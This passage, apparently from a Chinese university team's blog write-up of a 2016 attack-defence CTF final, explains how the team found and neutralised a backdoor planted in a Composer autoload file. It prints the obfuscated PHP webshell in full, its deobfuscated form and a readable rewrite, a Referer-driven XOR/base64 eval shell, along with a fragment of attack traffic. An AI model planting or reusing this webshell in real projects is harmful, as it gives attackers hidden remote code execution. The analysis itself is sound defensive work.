class="line">w2RG=system(&quot;CCCO5SSrVWrZsBdytM1xTLObt29O639w055UKmgnO55eXMYMzNiCcqfio&#x27;.system(&quot;DcnBcrhnwJDpGEeSTRrCnHfNBRbMvdfw8Yblp8W8u2G5ysE6G&quot;.unlink(&quot;QVcHdkVThSo0xAU4Zstc2jF6p6owFvqdah&#x27;.strrev(&#x27;jQwHGxixZF4s4mVVQko2jJ17j9yZgagl8ycD&quot;)))</span><br><span class="line">temp=L1Jqzh4S0PcMRxRGhkqQNHllS</span><br><span class="line">title=wV2iOeYuLEh41X7WvpGbXcgkJYPubTjEM2s9eYcPrXQMMG\</span><br></pre></td></tr></table></figure>
+
+<p>我们自己尝试了一下，第二个请求之后会直接报 <code>Slim application error</code>，但是保险起见我们将所有 UA 带有 <code>-kali-</code> 字样的请求全部 die 掉，第一个请求貌似是主办方的服务存活检测，因为将其 die 掉之后我们的网站虽然还能正常运行，但是被判定为 down（但是没有被 flag，这一点我没有及时注意到，这是我的锅），取消 die 之后又变回了只被 flag 的状态。后来惊觉：这是主办方留的后门被人利用了！在 <code>vendor/autoload.php</code> 下面发现了后门：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/composer&#x27;</span> . <span class="string">&#x27;/autoload_real.php&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> ComposerAutoloaderInit854778b4c93a322cf2f5c39e558d9f7a::getLoader();</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>vendor/composer/autoload_real.php</code> 中发现了这样一段代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signature For Report</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$h</span>=<span class="string">&#x27;_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$H</span>=<span class="string">&#x27;m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&quot;&amp;lt;)m$k&gt;$d&amp;lt;)m/)m$k&gt;)m&quot;);@sessio)mn_d)mestroy();&#125;&#125;&#125;&#125;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$N</span>=<span class="string">&#x27;mR;$rr)m=@$r[)m&quot;HTT)mP_RE)mFERER&quot;];$ra)m=)m@$r[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$u</span>=<span class="string">&#x27;$e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$f</span>=<span class="string">&#x27;$i&amp;lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&amp;lt;$c&amp;&amp;$i&amp;lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$O</span>=<span class="string">&#x27;[$i]=&quot;&quot;;$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$w</span>=<span class="string">&#x27;)m));)m$p=&quot;&quot;;fo)mr($z=1;)m$z&amp;lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$P</span>=<span class="string">&#x27;trt)molower&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$i</span>=<span class="string">&#x27;)marse_)mstr)m($u[&quot;q)muery&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&quot;/([\\w)m])m)[\\w-)m]+(?:;q=0.)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$x</span>=<span class="string">&#x27;m([\\d)m]))?,?/&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;$sl=&quot;s)m&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$y</span>=str_replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crbebbabte_funcbbtion&#x27;</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$c</span>=<span class="string">&#x27;$kh=&quot;4f7)m)mf&quot;;$kf=&quot;2)m)m8d7&quot;;funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&quot;&quot;;for()m$i=0;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$L</span>=str_replace(<span class="string">&#x27;)m&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$c</span>.<span class="variable">$f</span>.<span class="variable">$N</span>.<span class="variable">$i</span>.<span class="variable">$x</span>.<span class="variable">$P</span>.<span class="variable">$w</span>.<span class="variable">$O</span>.<span class="variable">$u</span>.<span class="variable">$h</span>.<span class="variable">$H</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="variable">$v</span>=<span class="variable">$y</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$L</span>);<span class="variable">$v</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">composerRequire854778b4c93a322cf2f5c39e558d9f7a</span>(<span class="params"><span class="variable">$fileIdentifier</span>, <span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;__composer_autoload_files&#x27;</span>][<span class="variable">$fileIdentifier</span>])) &#123;</span><br><span class="line">        <span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;__composer_autoload_files&#x27;</span>][<span class="variable">$fileIdentifier</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面那一串乱码一样的东西其实是个混淆，只要稍微改一改，顺着解析一遍就可以了。把最后的 <code>$v();</code> 去掉（一看就是用来执行解析出来的函数的），然后输出 <code>$y</code>、<code>$L</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【$y】</span><br><span class="line">create_function</span><br><span class="line">【$L】</span><br><span class="line">$kh=&quot;4f7f&quot;;$kf=&quot;28d7&quot;;function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o=&quot;&quot;;for($i=0;$i&amp;lt;$l;)&#123;for($j=0;($j&amp;lt;$c&amp;&amp;$i&amp;lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;$r=$_SERVER;$rr=@$r[&quot;HTTP_REFERER&quot;];$ra=@$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];if($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u[&quot;query&quot;],$q);$q=array_values($q);preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;,$ra,$m);if($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss=&quot;substr&quot;;$sl=&quot;strtolower&quot;;$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p=&quot;&quot;;for($z=1;$z&amp;lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0)&#123;$s[$i]=&quot;&quot;;$p=$ss($p,3);&#125;if(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);if($e)&#123;$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print(&quot;&amp;lt;$k&gt;$d&amp;lt;/$k&gt;&quot;);@session_destroy();&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以重点就是 <code>$L</code> 了。稍微美化一下，在不修改逻辑的情况下简化一些语句，可得：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encode</span>(<span class="params"><span class="variable">$text</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &amp;lt; strlen(<span class="variable">$text</span>);) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &amp;lt; strlen(<span class="variable">$key</span>) &amp;&amp; <span class="variable">$i</span> &amp;lt; strlen(<span class="variable">$text</span>)); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$text</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>] &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>]) &#123;</span><br><span class="line">    <span class="variable">$u</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>]);</span><br><span class="line">    parse_str(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>], <span class="variable">$get</span>);</span><br><span class="line">    <span class="variable">$get</span> = array_values(<span class="variable">$get</span>);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>], <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$get</span> &amp;&amp; <span class="variable">$match</span>) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$match</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$match</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$h</span> = strtolower(substr(md5(<span class="variable">$i</span>.<span class="string">&quot;4f7f&quot;</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span> = strtolower(substr(md5(<span class="variable">$i</span>.<span class="string">&quot;28d7&quot;</span>), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span> = <span class="number">1</span>; <span class="variable">$z</span> &amp;lt; count(<span class="variable">$match</span>[<span class="number">1</span>]); <span class="variable">$z</span>++) <span class="variable">$p</span> .= <span class="variable">$get</span>[<span class="variable">$match</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$p</span>, <span class="variable">$h</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$i</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$p</span> = substr(<span class="variable">$p</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$i</span>, <span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$i</span>] .= <span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span> = strpos(<span class="variable">$_SESSION</span>[<span class="variable">$i</span>], <span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="variable">$k</span> = <span class="string">&quot;4f7f28d7&quot;</span>;</span><br><span class="line">                ob_start();</span><br><span class="line">                @<span class="keyword">eval</span>(@gzuncompress(@xor_encode(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), substr(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span> = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                <span class="variable">$d</span> = base64_encode(xor_encode(gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&amp;lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&amp;lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出这就是个 webshell，内容是通过 Referer 传进来的。除了好多加密解密以绕过过滤的函数以外，核心代码在这儿：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">@<span class="keyword">eval</span>(@gzuncompress(@xor_encode(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>, <span class="string">&quot;/-/&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;+&quot;</span>), substr(<span class="variable">$s</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$e</span>))), <span class="variable">$k</span>)));</span><br><span class="line"><span class="variable">$o</span> = ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line"><span class="variable">$d</span> = base64_encode(xor_encode(gzcompress(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;&amp;lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&amp;lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所以只要以同样的方式传进来数据，那么显然可以直接 get shell！似乎这个文件由于权限问题没法直接修改，所以解决问题的最简单的方法就是在 <code>index.php</code> 中加入一行代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] = <span class="string">&#x27;Hello friend&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>改完之后又过了一轮，我们的 WEB 完全正常了。虽然这个时候已经被打的很惨了……</p>
+<p>至于那些 PWN 的题，@沈园 同学负责分析、补漏洞（直接手工修改二进制文件也是 666）、写 exp，@SummerZhang 同学来跑 exp，因为 exp 不是很稳定所以他还顺便当了一次人肉守护进程。</p>
+<p>当然，也多亏 @SummerZhang 同学连夜搞出了那道 400 分的静态分析题，现学现卖的能力果然好强。</p>
+<hr>
+<p>总之，还是我们的水平不够啊……不过这次比赛对我们以后为校内赛出题提供了很多思路，说不定以后的 NUAACTF 就不光会有 CTF，还会有渗透和攻防的赛程了呢！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2016/08/13/2016-nationwide-ctf-first-writeup/" data-id="clg6iymq10031guotds3494n1" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/09/07/2016-tianyi-ctf-final-writeup/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          2016 天翼杯信息安全竞赛决赛的一些经历
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/06/17/fake-whisper-viewer/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">让老司机纷纷翻车的“悄悄话查看器”究竟有啥名堂？</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+        <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 All Members<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/members" class="mobile-nav-link">Members</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+  </div>
+
+</body>
+
+</html>
